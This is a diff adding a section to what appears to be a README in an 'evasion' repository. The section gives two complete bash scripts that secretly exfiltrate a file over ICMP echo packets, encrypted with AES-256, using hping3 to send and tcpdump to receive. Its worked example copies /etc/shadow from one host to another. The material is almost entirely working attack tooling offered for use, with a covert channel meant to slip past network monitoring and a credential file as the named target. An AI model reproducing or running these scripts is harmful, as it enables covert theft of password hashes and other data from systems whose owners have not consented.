@@ -880,3 +880,263 @@ Output similar to the following should appear.
 
 "Windows"<br />
 ![alt text](https://github.com/billchaison/evasion/blob/master/udp05.png)
+
+## >> File Exfiltration Over ICMP
+
+These two scripts can be used to transmit a small file from one Linux host to another using ICMP echo request packets.  The packet data is encrypted using a shared AES-256 key you specify.  The file transfer is tied to a session ID of your choosing shared by both the sender and receiver, which is embedded within the packet data to filter out noise.  The receiver script temporarily disables ICMP echo replies since they are not needed.
+
+**Scenario**
+
+This example will show how to copy the /etc/shadow file from sender to receiver.  Start the following receiver script `ping_exfil_recv.sh` on the Linux host that the file is being sent to.  In this example 192.168.1.251 is the host IP.
+
+```bash
+#!/usr/bin/bash
+
+# check if running as root
+if [ "$EUID" -ne 0 ]
+then
+   echo "You must be root to run this script"
+   exit 1
+fi
+
+# validate input
+if [ "$#" -ne 3 ]
+then
+   echo "Error: provide <session ID> <AES-256 key> <output file>"
+   exit 1
+fi
+sessionid=$1
+aeskey=$2
+filename=$3
+tfile="$filename.tmp"
+echo $sessionid | grep ^"[0-9a-zA-Z]\{6,8\}"$ >/dev/null
+if [ "$?" -ne 0 ]
+then
+   echo "Error: <session ID> must be 6 to 8 alphanumeric characters"
+   exit 1
+fi
+echo $aeskey | grep ^"[0-9a-fA-F]\{64\}"$ >/dev/null
+if [ "$?" -ne 0 ]
+then
+   echo "Error: <AES-256 key> must be 64 hex characters"
+   exit 1
+fi
+
+# check dependencies
+deparr=("openssl" "tcpdump" "base64" "md5sum" "stdbuf" "sort")
+for d in ${deparr[@]}
+do
+   which $d >/dev/null
+   if [ "$?" -ne 0 ]
+   then
+      echo "Error: $d not installed"
+      exit 1
+   fi
+done
+
+# temporarily disable ICMP echo reply
+echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+# receive the data and reconstitute the file
+ipv4hdr=20
+icmphdr=8
+skip=$(($ipv4hdr+$icmphdr+1))
+rm $tfile 2>/dev/null
+rm $filename 2>/dev/null
+recvd=0
+count=0
+while read -r line
+do
+   packet=$(echo $line | base64 -d 2>/dev/null | sed 's/[^A-Za-z0-9/=+:]//g')
+   echo $packet | grep ^"$sessionid:" >/dev/null
+   if [ "$?" -eq 0 ]
+   then
+      pktarr=($(echo $packet | sed 's/:/ /g' | tr -s " "))
+      if [ "${#pktarr[@]}" -eq 4 ]
+      then
+         if [ "$count" -eq 0 ]
+         then
+            count=${pktarr[2]}
+         fi
+         if [ "$count" -gt 0 ]
+         then
+            chunk=${pktarr[1]}
+            if [ "$chunk" -le "$count" ]
+            then
+               encdata=${pktarr[3]}
+               grep ^"$chunk:$encdata" $tfile >/dev/null 2>&1
+               if [ "$?" -ne 0 ]
+               then
+                  recvd=$(($recvd+1))
+                  echo "$chunk:$encdata" >> $tfile
+               fi
+            else
+               chkval=${pktarr[3]}
+               break
+            fi
+         fi
+      fi
+   fi
+done < <(stdbuf -oL tcpdump -nn -t -A -s 0 -i eth0 icmp[icmptype] == 8 2>/dev/null | stdbuf -oL grep -v "^IP " | stdbuf -oL cut -c $skip- | stdbuf -oL sed 's/[^A-Za-z0-9/=+]//g')
+
+# restore ICMP echo reply
+echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+if [ "$recvd" -eq "$count" ] && [ "$count" -gt 0 ]
+then
+   echo "[+] Successfully received all $recvd file chunks."
+   echo "[+] Temp file data in: $tfile"
+   echo "[+] Reconstituting file from encrypted data."
+   for line in $(cat $tfile | sort -n -u)
+   do
+      encb64=$(echo $line | cut -d ":" -f 2)
+      echo -n $encb64 | base64 -d 2>/dev/null | openssl enc -aes-256-cbc -nosalt -K $aeskey -iv 00000000000000000000000000000000 -d 2>/dev/null >> $filename
+   done
+   filemd5=$(md5sum $filename | cut -d " " -f 1)
+   if [ "$filemd5" = "$chkval" ]
+   then
+      echo "[+] File copied successfully to:"
+      echo "$filename"
+      exit 0
+   else
+      echo "[-] File copy error, MD5 mismatch."
+      echo "[-] Check the temp file to attempt manual recovery."
+      echo $tfile
+      exit 1
+   fi
+else
+   echo "Error copying file.  Check the temp file to attempt manual recovery."
+   echo $tfile
+   exit 1
+fi
+```
+
+Now execute the sender script `ping_exfil_send.sh` using the same session ID and encryption key specified with the receiver.
+
+```bash
+#!/usr/bin/bash
+
+# check if running as root
+if [ "$EUID" -ne 0 ]
+then
+   echo "You must be root to run this script"
+   exit 1
+fi
+
+# validate input
+if [ "$#" -ne 4 ]
+then
+   echo "Error: provide <file> <session ID> <AES-256 key> <receiver IP>"
+   exit 1
+fi
+filename=$1
+sessionid=$2
+aeskey=$3
+targetip=$4
+echo $sessionid | grep ^"[0-9a-zA-Z]\{6,8\}"$ >/dev/null
+if [ "$?" -ne 0 ]
+then
+   echo "Error: <session ID> must be 6 to 8 alphanumeric characters"
+   exit 1
+fi
+echo $aeskey | grep ^"[0-9a-fA-F]\{64\}"$ >/dev/null
+if [ "$?" -ne 0 ]
+then
+   echo "Error: <AES-256 key> must be 64 hex characters"
+   exit 1
+fi
+echo $targetip | grep ^"[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}"$ >/dev/null
+if [ "$?" -ne 0 ]
+then
+   echo "Error: <receiver IP> must be IPv4 dotted decimal"
+   exit 1
+fi
+
+# check dependencies
+deparr=("hping3" "openssl" "base64" "md5sum")
+for d in ${deparr[@]}
+do
+   which $d >/dev/null
+   if [ "$?" -ne 0 ]
+   then
+      echo "Error: $d not installed"
+      exit 1
+   fi
+done
+
+# break up the file into AES block multiples, encrypt and transmit
+blockbytes=16
+readblocks=8
+chunk=$(($blockbytes*$readblocks))
+filebytes=$(stat -c%s "$filename" 2>/dev/null)
+if [ -z "$filebytes" ]
+then
+   echo "Error: could not get file size"
+   exit 1
+fi
+if [ "$filebytes" -eq 0 ]
+then
+   echo "Error: file is empty"
+   exit 1
+fi
+chkval=$(md5sum $filename | cut -d " " -f 1)
+readchunk=$(($filebytes/$chunk))
+remainder=$(($filebytes%$chunk))
+count=0
+delay="0.3"
+retries=2
+if [ "$readchunk" -gt 0 ]
+then
+   count=$readchunk
+   if [ "$remainder" -gt 0 ]
+   then
+      count=$(($count+1))
+   fi
+else
+   if [ "$remainder" -gt 0 ]
+   then
+      count=1
+   fi
+fi
+skip=0
+filepart=1
+if [ "$readchunk" -gt 0 ]
+then
+   while [ "$readchunk" -gt 0 ]
+   do
+      fpb64=$(dd if=$filename bs=$chunk count=1 skip=$skip 2>/dev/null | openssl enc -aes-256-cbc -nosalt -iv 00000000000000000000000000000000 -K $aeskey | base64 -w 0)
+      skip=$(($skip+1))
+      readchunk=$(($readchunk-1))
+      payload=$(echo -n "$sessionid:$filepart:$count:$fpb64" | base64 -w 0)
+      filepart=$(($filepart+1))
+      hping3 -1 -c $retries -e $payload $targetip >/dev/null 2>&1
+      sleep $delay
+   done
+   if [ "$remainder" -gt 0 ]
+   then
+      fpb64=$(dd if=$filename bs=1 count=$remainder skip=$(($skip*$chunk)) 2>/dev/null | openssl enc -aes-256-cbc -nosalt -iv 00000000000000000000000000000000 -K $aeskey | base64 -w 0)
+      payload=$(echo -n "$sessionid:$filepart:$count:$fpb64" | base64 -w 0)
+      filepart=$(($filepart+1))
+      hping3 -1 -c $retries -e $payload $targetip >/dev/null 2>&1
+      sleep $delay
+   fi
+else
+   fpb64=$(dd if=$filename bs=$remainder count=1 2>/dev/null | openssl enc -aes-256-cbc -nosalt -iv 00000000000000000000000000000000 -K $aeskey | base64 -w 0)
+   payload=$(echo -n "$sessionid:$filepart:$count:$fpb64" | base64 -w 0)
+   filepart=$(($filepart+1))
+   hping3 -1 -c $retries -e $payload $targetip >/dev/null 2>&1
+   sleep $delay
+fi
+payload=$(echo -n "$sessionid:$filepart:$count:$chkval" | base64 -w 0)
+hping3 -1 -c $retries -e $payload $targetip >/dev/null 2>&1
+sleep $delay
+
+echo "[+] Finished."
+exit 0
+```
+
+Sender<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/echo00.png)
+
+Receiver<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/echo01.png)
